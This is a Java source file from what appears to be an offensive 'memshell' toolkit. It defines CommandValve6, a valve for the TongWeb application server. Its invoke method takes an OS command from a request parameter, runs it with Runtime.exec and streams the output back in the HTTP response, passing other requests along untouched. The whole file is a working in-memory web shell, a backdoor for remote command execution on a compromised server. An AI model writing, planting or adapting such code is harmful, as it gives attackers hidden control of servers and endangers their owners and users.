package com.reajason.javaweb.memshell.tongweb.command;

import com.tongweb.web.thor.Valve;
import com.tongweb.web.thor.comet.CometEvent;
import com.tongweb.web.thor.connector.Request;
import com.tongweb.web.thor.connector.Response;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 */
public class CommandValve6 implements Valve {
    public static String paramName;
    protected Valve next;
    protected boolean asyncSupported;

    public CommandValve6() {
    }

    @Override
    public String getInfo() {
        return "";
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            String cmd = request.getParameter(paramName);
            if (cmd != null) {
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                ServletOutputStream outputStream = response.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            } else {
                this.getNext().invoke(request, response);
            }
        } catch (Exception e) {
            this.getNext().invoke(request, response);
        }
    }

    @Override
    public void event(Request var1, Response var2, CometEvent var3) throws IOException, ServletException {

    }
}